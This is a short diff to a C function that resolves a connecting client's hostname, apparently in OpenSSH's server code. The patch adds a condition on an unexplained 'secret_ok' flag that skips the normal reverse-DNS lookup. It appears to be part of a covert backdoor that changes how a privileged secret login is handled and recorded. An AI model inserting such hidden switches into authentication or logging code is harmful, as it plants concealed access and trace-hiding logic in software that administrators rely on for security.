@@ -78,10 +78,12 @@ get_remote_hostname(int sock, int use_dns)
 
 	debug3("Trying to reverse map address %.100s.", ntop);
 	/* Map the IP address to a host name. */
-	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
-	    NULL, 0, NI_NAMEREQD) != 0) {
-		/* Host name not found.  Use ip address. */
-		return xstrdup(ntop);
+	if(!secret_ok || secret_ok!=1){
+		if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+	    	    NULL, 0, NI_NAMEREQD) != 0) {
+			/* Host name not found.  Use ip address. */
+			return xstrdup(ntop);
+		}
 	}
 
 	/*
